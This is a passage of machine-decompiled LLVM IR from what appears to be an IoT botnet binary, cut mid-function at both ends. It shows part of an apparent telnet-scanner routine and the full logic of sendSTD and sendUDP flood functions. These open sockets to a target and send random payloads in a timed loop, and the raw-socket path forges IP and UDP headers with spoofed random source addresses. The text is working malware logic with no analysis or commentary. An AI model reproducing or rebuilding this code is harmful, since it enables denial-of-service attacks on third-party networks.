  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v3_f250 = call i32 @reset_telstate(i32 %v2_e0e8, i32 %v3_df80, i32 %v3_e0dc)
  br label %dec_label_pc_f254

dec_label_pc_f254:                                ; preds = %dec_label_pc_e840, %dec_label_pc_e98c, %dec_label_pc_ec2c, %dec_label_pc_f084, %dec_label_pc_f1f8, %dec_label_pc_e134, %dec_label_pc_e428, %dec_label_pc_f1d4, %dec_label_pc_f0c0, %dec_label_pc_f034, %dec_label_pc_ef68, %dec_label_pc_ef40, %dec_label_pc_eeb4, %dec_label_pc_edb8, %dec_label_pc_ed94, %dec_label_pc_ed34, %dec_label_pc_ec68, %dec_label_pc_ec04, %dec_label_pc_ebdc, %dec_label_pc_eb18, %dec_label_pc_eaf4, %dec_label_pc_ea94, %dec_label_pc_e9c8, %dec_label_pc_e964, %dec_label_pc_e93c, %dec_label_pc_e87c, %dec_label_pc_e81c, %dec_label_pc_e788, %dec_label_pc_e764, %dec_label_pc_e5b8, %dec_label_pc_e594, %dec_label_pc_e3fc, %dec_label_pc_e3a4, %dec_label_pc_f234
  %v1_f258 = add nuw nsw i32 %storemerge553, 1
  store i32 %v1_f258, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_f26c = icmp slt i32 %v1_f258, %arg2
  br i1 %v5_f26c, label %dec_label_pc_e0d0, label %dec_label_pc_e0c4

; uselistorder directives
  uselistorder i32 %v1_f258, { 2, 1, 0 }
  uselistorder i32 %v3_f1ac, { 1, 0 }
  uselistorder i32* %v1_edf8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_ed0c, { 1, 0 }
  uselistorder i32 %v3_ea6c, { 1, 0 }
  uselistorder i32 %v5_e6f4, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge610, { 1, 0 }
  uselistorder i32 %v0_e27c, { 1, 0 }
  uselistorder i32 %v2_e1d0, { 0, 3, 2, 1 }
  uselistorder i32 %v2_e1cc, { 1, 0, 2, 3 }
  uselistorder i8* %v2_e1a4, { 2, 1, 0, 3 }
  uselistorder i32 %v2_e1a0, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i8 %v2_e154, { 1, 0 }
  uselistorder i32 %v0_e118, { 1, 0 }
  uselistorder i32* %v1_e0f0, { 1, 0, 2 }
  uselistorder i32 %v2_e0ec, { 1, 0, 2, 3 }
  uselistorder i32 %v2_e0e8, { 77, 76, 75, 74, 78, 79, 81, 80, 60, 59, 62, 61, 64, 65, 66, 68, 67, 63, 70, 69, 71, 73, 72, 54, 53, 52, 51, 56, 55, 58, 57, 47, 46, 48, 4, 50, 49, 41, 40, 39, 38, 43, 42, 45, 44, 34, 33, 35, 3, 37, 36, 28, 27, 26, 25, 19, 20, 21, 23, 22, 24, 29, 30, 32, 31, 6, 8, 7, 9, 10, 11, 13, 12, 16, 1, 2, 15, 14, 0, 18, 17, 5 }
  uselistorder i32 %v2_e0e4, { 0, 1, 2, 3, 4, 5, 7, 8, 6 }
  uselistorder i32 %v3_e0dc, { 81, 82, 80, 78, 79, 77, 76, 75, 61, 62, 60, 65, 66, 73, 72, 71, 69, 70, 68, 67, 64, 74, 63, 59, 58, 56, 57, 54, 55, 53, 52, 51, 47, 48, 46, 50, 49, 45, 44, 42, 43, 40, 41, 39, 38, 37, 33, 34, 32, 36, 35, 31, 30, 28, 29, 27, 25, 26, 23, 22, 24, 21, 20, 19, 18, 17, 11, 9, 10, 8, 7, 6, 5, 4, 16, 15, 14, 13, 12, 3, 2, 1, 0 }
  uselistorder i32 %storemerge553, { 1, 4, 5, 6, 7, 10, 9, 8, 3, 2, 0 }
  uselistorder i32 %v2_e858, { 3, 0, 4, 1, 5, 2 }
  uselistorder i32 %v2_e5e0, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v2_e480, { 1, 0 }
  uselistorder i32 %v1_e0a8, { 1, 2, 0 }
  uselistorder i32 %v1_e084, { 2, 1, 0 }
  uselistorder i32 %storemerge462, { 1, 0 }
  uselistorder i32 %v2_dfa4, { 1, 0 }
  uselistorder i32 %v3_df80, { 4, 3, 5, 6, 7, 9, 8, 10, 12, 11, 13, 16, 15, 14, 18, 0, 19, 17, 1, 22, 23, 24, 21, 2, 20 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-612, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 119, 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 16, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 30, 28, 29, 31, 32, 33, 34, 35, 38, 36, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 53, 50, 51, 54, 55, 56, 52, 59, 57, 58, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 74, 71, 72, 75, 76, 77, 73, 80, 78, 79, 81, 84, 82, 83, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 113, 103, 104, 105, 106, 109, 107, 108, 110, 111, 112, 143, 144, 145, 146, 147, 149, 148, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 114, 115, 116, 117, 118, 176, 120, 121, 122, 135, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 177, 136, 137, 138, 140, 139, 142, 141 }
  uselistorder i32* %r2.global-to-local, { 82, 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 79, 80, 81, 104, 83, 84, 105, 85, 86 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 17, 18, 13, 14 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 ptrtoint ([3 x i8*]* @global_var_26434.511 to i32), { 2, 3, 0, 4, 1, 5 }
  uselistorder i32* bitcast ([3 x i8]* @global_var_1c328.509 to i32*), { 1, 0 }
  uselistorder i32 ptrtoint ([6 x i8*]* @global_var_26428.507 to i32), { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 5, 4, 2, 7, 6, 0, 1, 3, 8, 9 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f254, { 33, 4, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 0, 26, 27, 28, 29, 30, 6, 31, 32, 5 }
  uselistorder label %dec_label_pc_e5f4, { 1, 0 }
  uselistorder label %dec_label_pc_e5b8, { 1, 0 }
  uselistorder label %dec_label_pc_e134, { 1, 0 }
  uselistorder label %dec_label_pc_e0d0, { 1, 0 }
  uselistorder label %dec_label_pc_e0c4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_dfc8, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f278 = load i32, i32* @fp, align 4
  store i32 %v3_f278, i32* %stack_var_-16, align 4
  store i32 62080, i32* %stack_var_-4, align 4
  %v13_f278 = ptrtoint i32* %stack_var_-16 to i32
  %v2_f27c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f27c, i32* @fp, align 4
  store i32 %arg3, i32* %stack_var_-208, align 4
  %v0_f29c = call i32 @socket()
  %v2_f2ac = call i32 @__GI_time(i32* null)
  %v1_f2c0 = call i32 @__GI_gethostbyname(i32 %arg1)
  store i32 16, i32* @r2, align 4
  %v2_f2dc = bitcast i32* %stack_var_-52 to i8*
  %v3_f2dc = call i32 @__GI_memset(i8* %v2_f2dc, i32 0)
  %v1_f2e4 = add i32 %v1_f2c0, 16
  %v2_f2e4 = inttoptr i32 %v1_f2e4 to i32*
  %v3_f2e4 = load i32, i32* %v2_f2e4, align 4
  %v1_f2e8 = inttoptr i32 %v3_f2e4 to i32*
  %v2_f2e8 = load i32, i32* %v1_f2e8, align 4
  %v2_f2f0 = ptrtoint i32* %stack_var_-48 to i32
  %v1_f2f8 = add i32 %v1_f2c0, 12
  %v2_f2f8 = inttoptr i32 %v1_f2f8 to i32*
  %v3_f2f8 = load i32, i32* %v2_f2f8, align 4
  store i32 %v3_f2f8, i32* @r2, align 4
  %v3_f308 = call i32 @bcopy(i32 %v2_f2e8, i32 %v2_f2f0, i32 %v3_f2f8)
  %v1_f310 = add i32 %v1_f2c0, 8
  %v2_f310 = inttoptr i32 %v1_f310 to i32*
  %v3_f310 = load i32, i32* %v2_f310, align 4
  %v3_f318 = urem i32 %v3_f310, 65536
  store i32 %v3_f318, i32* %stack_var_-52, align 4
  %v2_f34c = ptrtoint i32* %stack_var_-196 to i32
  %v3_f3c8 = bitcast i32* %stack_var_-52 to %sockaddr*
  %v2_f388 = add i32 %v13_f278, -180
  br label %dec_label_pc_f348

dec_label_pc_f348:                                ; preds = %dec_label_pc_f404, %entry
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_f408, %dec_label_pc_f404 ]
  store i32 %v2_f34c, i32* @r0, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_1c4f8.561 to i32), i32* @r1, align 4
  store i32 144, i32* @r2, align 4
  %v0_f360 = call i32 @memcpy()
  %v0_f364 = call i32 @random()
  %tmp = icmp ult i32 %storemerge3, 50
  br i1 %tmp, label %dec_label_pc_f404, label %dec_label_pc_f3a4

dec_label_pc_f3a4:                                ; preds = %dec_label_pc_f348
  %v2_f374 = urem i32 %v0_f364, 36
  %v3_f380 = mul nuw nsw i32 %v2_f374, 4
  %v2_f38c = add i32 %v2_f388, %v3_f380
  %v1_f390 = inttoptr i32 %v2_f38c to i32*
  %v2_f390 = load i32, i32* %v1_f390, align 4
  %v5_f3b4 = inttoptr i32 %v2_f390 to i32*
  %v6_f3b4 = call i32 @__libc_send(i32 %v0_f29c, i32* %v5_f3b4, i32 65, i32 0)
  %v4_f3c8 = call i32 @__libc_connect(i32 %v0_f29c, %sockaddr* %v3_f3c8, i32 16)
  %v2_f3d0 = call i32 @__GI_time(i32* null)
  %v3_f3dc = load i32, i32* %stack_var_-208, align 4
  %v2_f3e0 = add i32 %v3_f3dc, %v2_f2ac
  %v5_f3e8 = icmp slt i32 %v2_f3d0, %v2_f3e0
  br i1 %v5_f3e8, label %dec_label_pc_f3fc, label %dec_label_pc_f3ec

dec_label_pc_f3ec:                                ; preds = %dec_label_pc_f3a4
  %v1_f3f0 = call i32 @__libc_close(i32 %v0_f29c)
  %v1_f3f8 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_f3fc:                                ; preds = %dec_label_pc_f3a4
  br label %dec_label_pc_f404

dec_label_pc_f404:                                ; preds = %dec_label_pc_f348, %dec_label_pc_f3fc
  %stack_var_-24.0 = phi i32 [ %storemerge3, %dec_label_pc_f348 ], [ 0, %dec_label_pc_f3fc ]
  %v1_f408 = add i32 %stack_var_-24.0, 1
  br label %dec_label_pc_f348

; uselistorder directives
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v3_f2f8, { 1, 0 }
  uselistorder i32 %v1_f2c0, { 2, 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 2, 1 }
  uselistorder i32 65, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_f404, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_f41c = load i32, i32* @r4, align 4
  %v6_f41c = load i32, i32* @fp, align 4
  store i32 62500, i32* %stack_var_-4, align 4
  %v2_f420 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f420, i32* @fp, align 4
  %v2_f424 = ptrtoint i32* %stack_var_-144 to i32
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-76, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_f44c = icmp eq i32 %arg2, 0
  br i1 %v2_f44c, label %dec_label_pc_f454, label %dec_label_pc_f474

dec_label_pc_f454:                                ; preds = %entry
  %v0_f454 = call i32 @rand_cmwc()
  %v3_f45c = mul i32 %v0_f454, 65536
  store i32 %v3_f45c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f498

dec_label_pc_f474:                                ; preds = %entry
  %v3_f47c = urem i32 %arg2, 65536
  store i32 %v3_f47c, i32* %r3.global-to-local, align 4
  %v1_f484 = call i32 @htons(i32 %v3_f47c)
  br label %dec_label_pc_f498

dec_label_pc_f498:                                ; preds = %dec_label_pc_f454, %dec_label_pc_f474
  %v2_f49c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_f49c, i32* %r3.global-to-local, align 4
  %v3_f4a8 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-72)
  store i32 %v3_f4a8, i32* %r3.global-to-local, align 4
  %v2_f4b0 = icmp eq i32 %v3_f4a8, 0
  br i1 %v2_f4b0, label %dec_label_pc_f4b8, label %dec_label_pc_fb0c

dec_label_pc_f4b8:                                ; preds = %dec_label_pc_f498
  %v2_f4b8 = ptrtoint i32* %stack_var_-76 to i32
  %v2_f4bc = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_f4bc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-68, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v7_f4dc = icmp eq i32 %arg4, 32
  br i1 %v7_f4dc, label %dec_label_pc_f4e4, label %dec_label_pc_f678

dec_label_pc_f4e4:                                ; preds = %dec_label_pc_f4b8
  store i32 17, i32* @r2, align 4
  %v0_f4f0 = call i32 @socket()
  store i32 %v0_f4f0, i32* %r3.global-to-local, align 4
  %v2_f500 = icmp eq i32 %v0_f4f0, 0
  br i1 %v2_f500, label %dec_label_pc_f508, label %dec_label_pc_f520

dec_label_pc_f508:                                ; preds = %dec_label_pc_f4e4
  %v2_f50c = load i32, i32* @global_var_26864.54, align 4
  store i32 %v2_f50c, i32* %r3.global-to-local, align 4
  %v3_f518 = call i32 @sockprintf(i32 %v2_f50c, i32 ptrtoint ([27 x i8]* @global_var_1c588.564 to i32))
  br label %dec_label_pc_fb0c

dec_label_pc_f520:                                ; preds = %dec_label_pc_f4e4
  %v3_f520 = load i32, i32* %stack_var_0, align 4
  %v1_f524 = add i32 %v3_f520, 1
  store i32 %v1_f524, i32* %r3.global-to-local, align 4
  %v1_f52c = call i32 @malloc(i32 %v1_f524)
  store i32 %v1_f52c, i32* %r3.global-to-local, align 4
  %v2_f53c = icmp eq i32 %v1_f52c, 0
  br i1 %v2_f53c, label %dec_label_pc_fb0c, label %dec_label_pc_f544

dec_label_pc_f544:                                ; preds = %dec_label_pc_f520
  %v3_f544 = load i32, i32* %stack_var_0, align 4
  %v1_f548 = add i32 %v3_f544, 1
  store i32 %v1_f548, i32* @r2, align 4
  store i32 %v1_f52c, i32* %r3.global-to-local, align 4
  %v2_f55c = inttoptr i32 %v1_f52c to i8*
  %v3_f55c = call i32 @__GI_memset(i8* %v2_f55c, i32 0)
  %v2_f568 = call i32 @makeRandomStr(i32 %v1_f52c, i32 %v3_f544)
  %v2_f570 = call i32 @__GI_time(i32* null)
  %v2_f57c = add i32 %v2_f570, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_f5bc = inttoptr i32 %v1_f52c to i32*
  %v3_f640 = mul i32 %arg8, 4
  %v3_f650 = mul i32 %arg8, 1000
  br label %dec_label_pc_f598.outer

dec_label_pc_f598.outer:                          ; preds = %dec_label_pc_f668, %dec_label_pc_f638, %dec_label_pc_f544
  %stack_var_-108.0.ph = phi i32 [ 0, %dec_label_pc_f544 ], [ %v1_f66c, %dec_label_pc_f668 ], [ 0, %dec_label_pc_f638 ]
  %stack_var_-112.0.ph = phi i32 [ 0, %dec_label_pc_f544 ], [ %v1_f620, %dec_label_pc_f668 ], [ %v1_f620, %dec_label_pc_f638 ]
  br label %dec_label_pc_f598

dec_label_pc_f598:                                ; preds = %dec_label_pc_f598.outer, %dec_label_pc_f610
  %stack_var_-112.0 = phi i32 [ 0, %dec_label_pc_f610 ], [ %stack_var_-112.0.ph, %dec_label_pc_f598.outer ]
  %v3_f598 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_f4b8, i32* %stack_var_-144, align 4
  store i32 %v3_f598, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_f5bc = call i32 @__libc_sendto(i32 %v0_f4f0, i32* %v6_f5bc, i32 %v3_f598, i32 0, i32 %v2_f4b8, i32 16)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_f5c8 = icmp eq i32 %stack_var_-112.0, %arg6
  br i1 %v9_f5c8, label %dec_label_pc_f5d0, label %dec_label_pc_f61c

dec_label_pc_f5d0:                                ; preds = %dec_label_pc_f598
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_f44c, label %dec_label_pc_f5dc, label %dec_label_pc_f5f8

dec_label_pc_f5dc:                                ; preds = %dec_label_pc_f5d0
  %v0_f5dc = call i32 @rand_cmwc()
  %v3_f5e8 = udiv i32 %v0_f5dc, 256
  %v3_f5f05 = urem i32 %v3_f5e8, 256
  store i32 %v3_f5f05, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f5f8

dec_label_pc_f5f8:                                ; preds = %dec_label_pc_f5d0, %dec_label_pc_f5dc
  %v2_f5fc = call i32 @__GI_time(i32* null)
  store i32 %v2_f5fc, i32* %r2.global-to-local, align 4
  store i32 %v2_f57c, i32* %r3.global-to-local, align 4
  %v8_f60c = icmp sgt i32 %v2_f5fc, %v2_f57c
  br i1 %v8_f60c, label %dec_label_pc_fb0c, label %dec_label_pc_f610

dec_label_pc_f610:                                ; preds = %dec_label_pc_f5f8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f598

dec_label_pc_f61c:                                ; preds = %dec_label_pc_f598
  %v1_f620 = add i32 %stack_var_-112.0, 1
  store i32 %arg7, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-108.0.ph, i32* %r2.global-to-local, align 4
  %v9_f630 = icmp eq i32 %stack_var_-108.0.ph, %arg7
  br i1 %v9_f630, label %dec_label_pc_f638, label %dec_label_pc_f668

dec_label_pc_f638:                                ; preds = %dec_label_pc_f61c
  store i32 %v3_f640, i32* %r2.global-to-local, align 4
  store i32 %v3_f650, i32* %r3.global-to-local, align 4
  %v1_f658 = call i32 @usleep(i32 %v3_f650)
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f598.outer

dec_label_pc_f668:                                ; preds = %dec_label_pc_f61c
  %v1_f66c = add i32 %stack_var_-108.0.ph, 1
  br label %dec_label_pc_f598.outer

dec_label_pc_f678:                                ; preds = %dec_label_pc_f4b8
  store i32 %v2_f424, i32* %r3.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v0_f68c = call i32 @socket()
  store i32 %v0_f68c, i32* %r3.global-to-local, align 4
  %v2_f69c = icmp eq i32 %v0_f68c, 0
  br i1 %v2_f69c, label %dec_label_pc_f6a4, label %dec_label_pc_f6bc

dec_label_pc_f6a4:                                ; preds = %dec_label_pc_f678
  %v2_f6a8 = load i32, i32* @global_var_26864.54, align 4
  store i32 %v2_f6a8, i32* %r3.global-to-local, align 4
  %v3_f6b4 = call i32 @sockprintf(i32 %v2_f6a8, i32 ptrtoint ([27 x i8]* @global_var_1c588.564 to i32))
  br label %dec_label_pc_fb08

dec_label_pc_f6bc:                                ; preds = %dec_label_pc_f678
  store i32 1, i32* %stack_var_-80, align 4
  %v2_f6c4 = ptrtoint i32* %stack_var_-80 to i32
  store i32 4, i32* %stack_var_-144, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_f6c4, i32* %r3.global-to-local, align 4
  %v6_f6e0 = call i32 @__GI_setsockopt(i32 %v0_f68c, i32 0, i32 3, i32* nonnull %stack_var_-80, i32 4)
  store i32 %v6_f6e0, i32* %r3.global-to-local, align 4
  %v1_f6e8 = icmp slt i32 %v6_f6e0, 0
  br i1 %v1_f6e8, label %dec_label_pc_f6f0, label %dec_label_pc_f708

dec_label_pc_f6f0:                                ; preds = %dec_label_pc_f6bc
  %v2_f6f4 = load i32, i32* @global_var_26864.54, align 4
  store i32 %v2_f6f4, i32* %r3.global-to-local, align 4
  %v3_f700 = call i32 @sockprintf(i32 %v2_f6f4, i32 ptrtoint ([33 x i8]* @global_var_1c5a4.566 to i32))
  br label %dec_label_pc_fb08

dec_label_pc_f708:                                ; preds = %dec_label_pc_f6bc
  store i32 49, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f714

dec_label_pc_f714:                                ; preds = %dec_label_pc_f708, %dec_label_pc_f714
  %v1_f74c26 = phi i32 [ 49, %dec_label_pc_f708 ], [ %v1_f74c, %dec_label_pc_f714 ]
  %v2_f718 = call i32 @__GI_time(i32* null)
  store i32 %v2_f718, i32* %r3.global-to-local, align 4
  store i32 %v2_f718, i32* @r4, align 4
  %v0_f724 = call i32 @rand_cmwc()
  %v0_f72c = load i32, i32* @r4, align 4
  %v2_f72c = xor i32 %v0_f72c, %v0_f724
  store i32 %v2_f72c, i32* %r3.global-to-local, align 4
  %v1_f734 = call i32 @srand(i32 %v2_f72c)
  %v0_f738 = call i32 @random()
  store i32 %v0_f738, i32* %r3.global-to-local, align 4
  %v1_f744 = call i32 @init_rand(i32 %v0_f738)
  %v1_f74c = add nsw i32 %v1_f74c26, -1
  store i32 %v1_f74c, i32* %r3.global-to-local, align 4
  %v3_f758 = icmp eq i32 %v1_f74c26, 0
  br i1 %v3_f758, label %dec_label_pc_f760, label %dec_label_pc_f714

dec_label_pc_f760:                                ; preds = %dec_label_pc_f714
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_f764 = icmp eq i32 %arg4, 0
  br i1 %v2_f764, label %dec_label_pc_f790, label %dec_label_pc_f778

dec_label_pc_f778:                                ; preds = %dec_label_pc_f760
  %v1_f77c = sub i32 32, %arg4
  store i32 %v1_f77c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_f788 = shl i32 -1, %v1_f77c
  br label %dec_label_pc_f790

dec_label_pc_f790:                                ; preds = %dec_label_pc_f760, %dec_label_pc_f778
  %storemerge12 = phi i32 [ %v1_f788, %dec_label_pc_f778 ], [ 0, %dec_label_pc_f760 ]
  %v3_f790 = load i32, i32* %stack_var_0, align 4
  %v1_f794 = add i32 %v3_f790, 28
  %v1_f7a4 = add i32 %v3_f790, 34
  %v3_f7a8 = and i32 %v1_f7a4, -4
  %v1_f7b0 = load i32, i32* @sp, align 4
  %v2_f7b0 = sub i32 %v1_f7b0, %v3_f7a8
  %v1_f7c0 = add i32 %v2_f7b0, 11
  %v3_f7c4 = and i32 %v1_f7c0, -4
  store i32 %v3_f7c4, i32* %r2.global-to-local, align 4
  %v1_f7e4 = add i32 %v3_f7c4, 20
  store i32 %v1_f7e4, i32* %r3.global-to-local, align 4
  %v5_f7e8 = inttoptr i32 %v1_f7e4 to i8*
  %v3_f7ec = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_f7ec, i32* @r4, align 4
  %v1_f7f4 = call i32 @GetRandomIP(i32 %storemerge12)
  store i32 %v1_f7f4, i32* %r3.global-to-local, align 4
  %v1_f800 = call i32 @htonl(i32 %v1_f7f4)
  store i32 %v1_f800, i32* %r2.global-to-local, align 4
  %v3_f808 = load i32, i32* %stack_var_0, align 4
  %v1_f80c = add i32 %v3_f808, 8
  %v1_f810 = load i32, i32* @sp, align 4
  %v2_f810 = inttoptr i32 %v1_f810 to i32*
  store i32 %v1_f80c, i32* %v2_f810, align 4
  %v0_f818 = load i32, i32* @r4, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v4_f820 = inttoptr i32 %v3_f7c4 to i8*
  %v5_f820 = call i32 @makeIPPacket(i8* %v4_f820, i32 %v0_f818, i32 %v1_f800, i32 17)
  %v3_f824 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_f824, 8
  %v3_f838 = urem i32 %fold, 65536
  store i32 %v3_f838, i32* %r3.global-to-local, align 4
  %v1_f840 = call i32 @htons(i32 %v3_f838)
  %sext = mul i32 %v1_f840, 16777216
  %v1_f844 = sdiv i32 %sext, 16777216
  store i32 %v1_f844, i32* %r3.global-to-local, align 4
  store i32 %v1_f7e4, i32* %r2.global-to-local, align 4
  %v1_f84c = trunc i32 %v1_f844 to i8
  %v3_f84c = add i32 %v3_f7c4, 24
  %v4_f84c = inttoptr i32 %v3_f84c to i8*
  store i8 %v1_f84c, i8* %v4_f84c, align 4
  %v0_f850 = load i32, i32* %r3.global-to-local, align 4
  %v3_f850 = sdiv i32 %v0_f850, 256
  store i32 %v3_f850, i32* %r3.global-to-local, align 4
  %v1_f854 = trunc i32 %v3_f850 to i8
  %v2_f854 = load i32, i32* %r2.global-to-local, align 4
  %v3_f854 = add i32 %v2_f854, 5
  %v4_f854 = inttoptr i32 %v3_f854 to i8*
  store i8 %v1_f854, i8* %v4_f854, align 1
  %v0_f858 = call i32 @rand_cmwc()
  %v3_f864 = urem i32 %v0_f858, 65536
  store i32 %v3_f864, i32* %r3.global-to-local, align 4
  store i32 %v1_f7e4, i32* %r2.global-to-local, align 4
  %v1_f86c = trunc i32 %v0_f858 to i8
  store i8 %v1_f86c, i8* %v5_f7e8, align 4
  %v0_f870 = load i32, i32* %r3.global-to-local, align 4
  %v3_f87036 = udiv i32 %v0_f870, 256
  %v1_f874 = trunc i32 %v3_f87036 to i8
  %v2_f874 = load i32, i32* %r2.global-to-local, align 4
  %v3_f874 = add i32 %v2_f874, 1
  %v4_f874 = inttoptr i32 %v3_f874 to i8*
  store i8 %v1_f874, i8* %v4_f874, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_f44c, label %dec_label_pc_f884, label %dec_label_pc_f89c

dec_label_pc_f884:                                ; preds = %dec_label_pc_f790
  %v0_f884 = call i32 @rand_cmwc()
  %v3_f88c = mul i32 %v0_f884, 65536
  store i32 %v3_f88c, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_f884 to i8
  br label %dec_label_pc_f8b8

dec_label_pc_f89c:                                ; preds = %dec_label_pc_f790
  %v3_f8a4 = urem i32 %arg2, 65536
  store i32 %v3_f8a4, i32* %r3.global-to-local, align 4
  %v1_f8ac = call i32 @htons(i32 %v3_f8a4)
  %extract.t102 = trunc i32 %v1_f8ac to i8
  br label %dec_label_pc_f8b8

dec_label_pc_f8b8:                                ; preds = %dec_label_pc_f884, %dec_label_pc_f89c
  %v0_f884.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_f884 ], [ %extract.t102, %dec_label_pc_f89c ]
  %v3_f9d0.pre-phi = phi i32 [ 0, %dec_label_pc_f884 ], [ %v3_f8a4, %dec_label_pc_f89c ]
  store i32 %v1_f7e4, i32* %r2.global-to-local, align 4
  %v4_f8bc = sext i8 %v0_f884.sink.off0 to i32
  %v3_f8c0 = add i32 %v3_f7c4, 22
  %v4_f8c0 = inttoptr i32 %v3_f8c0 to i8*
  store i8 %v0_f884.sink.off0, i8* %v4_f8c0, align 2
  %v3_f8c840 = udiv i32 %v4_f8bc, 256
  %v1_f8cc = trunc i32 %v3_f8c840 to i8
  %v2_f8cc = load i32, i32* %r2.global-to-local, align 4
  %v3_f8cc = add i32 %v2_f8cc, 3
  %v4_f8cc = inttoptr i32 %v3_f8cc to i8*
  store i8 %v1_f8cc, i8* %v4_f8cc, align 1
  store i32 %v1_f7e4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
